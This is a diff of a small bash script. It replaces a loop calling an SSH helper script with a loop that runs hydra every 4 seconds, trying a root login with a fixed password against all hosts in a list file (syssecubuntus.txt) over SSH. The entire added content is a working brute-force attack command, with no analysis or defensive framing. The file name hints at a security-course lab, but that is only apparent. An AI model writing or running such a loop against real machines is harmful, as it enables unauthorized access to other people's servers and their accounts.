@@ -1,9 +1,8 @@
 #!/bin/bash
-# Runs ssh_run.py on a sweep, every 4 seconds, until Ctrl+C.
-# Usage: ./run_every_4s.sh -x 0-36 -u sysadmin -c "whoami"
-# Any arguments are passed straight through to ssh_run.py.
+# Runs the hydra brute-force command every 4 seconds, until Ctrl+C.
+# Run from the backup/ directory, or adjust the path to syssecubuntus.txt.
 
 while true; do
-    python3 ssh_run.py --once "$@"
+    hydra -l root -p 'hiasdfasdfasdf' -M syssecubuntus.txt ssh -t 32 -c 1
     sleep 4
 done
